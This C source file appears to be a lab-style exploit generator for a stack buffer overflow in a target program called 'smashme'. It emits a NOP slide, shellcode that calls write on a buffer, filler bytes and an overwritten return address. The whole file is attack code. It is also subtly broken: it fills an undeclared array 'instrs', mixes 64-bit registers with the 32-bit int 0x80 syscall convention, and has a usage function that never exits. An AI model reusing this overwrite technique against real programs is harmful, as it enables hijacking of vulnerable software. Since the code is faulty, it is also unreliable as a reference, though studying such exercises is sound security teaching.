#include "smashme.h"
#include <string.h>

// size of array, will be checked
#define ARRAY_SIZE 1000

// length of NOP slide, see phrack 49
#define SLIDE_LEN 16

// -1 will be replaced with the \0
// -2 will be replaced with the buffer start location
char * instructions =
"0x48    0xc7    0xc0    0x04    -1    -1    -1 "
"0x48    0xc7    0xc3    0x01    -1    -1    -1 "
"0x48    0xc7    0x04    0x25    -2    0x07    -1    -1    -1 "
"0x48    0xc7    0xc1    -2 "
"0x48    0xc7    0xc2    0x01    -1    -1    -1 "
"0xcd    0x80 "
"0xeb    0xfe ";
/*
 mov $4, %rax 					// syscall 4 = write
 mov $1, %rbx 					// file desc 1 = stdout
 mov <character>, <bufferStart> // character to write
 mov <bufferStart>, %rcx 		// buffer location
 mov $1, %rdx 					// string length = 1
 int 0x80 						// syscall

 this calls write(1,<bufferStart>,1)
 with the string at <bufferStart>
 */

void usageAndExit();

int main(int argc, char * const argv[]) {

	if(argc != 2) {
		usageAndExit();
	}

	// location of stack buffer
    long stackLoc = strtol(argv[1], NULL, 16);
    if(stackLoc == 0 || stackLoc == LONG_MIN || stackLoc == LONG_MAX) {
    	usageAndExit();
    }
	// size of an address
	int addressSize = sizeof(void*);
	// rounds BUFF_SZ up to the nearest address size
	int alignedBuff = ((BUFF_SZ + addressSize - 1) / addressSize) * addressSize;
	// add one address size for the saved base pointer
	int skip = alignedBuff + addressSize;
    // the buffer is skip + ret_addr away from end of stack buffer
	long buffLoc = STACK_SZ - (skip + addressSize);
    // start of buffer, will be written over return address in smashme
	long new_ret_addr = stackLoc + buffLoc;

    // can't tokenize read-only data array
    char writableInstrs[ARRAY_SIZE];
    strncpy(writableInstrs, instructions, ARRAY_SIZE);

    // actual bytes of the instructions
    char instrBytes[ARRAY_SIZE];
    int numChars = 0;

    // loop through tokens, converting to bytes
    char * token = strtok(writableInstrs, " \t\r\n");
    while (token != NULL) {
    	long base10 = strtol(token, NULL, 10);
        if (base10 == -1) {
            instrs[numChars++] = '\0';
        } else if (base10 == -2) {
        	long ret_addr_copy = new_ret_addr;
            int i;
            for (i = 0; i < sizeof(int); i++) {
            	// mask off upper bytes
                instrs[numChars++] = (char) ret_addr_copy;
                // shift bytes to the right
                ret_addr_copy >>= 8;
            }
        }
        else {
            instrBytes[numChars++] = (char) (strtol(token, NULL, 16));
        }

        // next token
        token = strtok(NULL, " \t\r\n");
    }

    int i = 0;

    // print NOP slide
    for (; i < SLIDE_LEN; i++) {
        printf("%c", 0x90);
    }

    // prints instruction bytes
    int j = 0;
    for (; j < numChars; j++) {
        printf("%c", instrBytes[j]);
    }
    i += j;

    // print useless bytes
    for (; i < skip; i++) {
        printf("%c", 'A');
    }

    // print new_ret_addr bytes starting from LSB
    for (i = 0; i < sizeof(long); i++) {
        printf("%c", (new_ret_addr & LSB_MASK));
        new_ret_addr = new_ret_addr >> 8;
    }
}

void usageAndExit() {
	printf("usage: configure <hexAddress>");
}


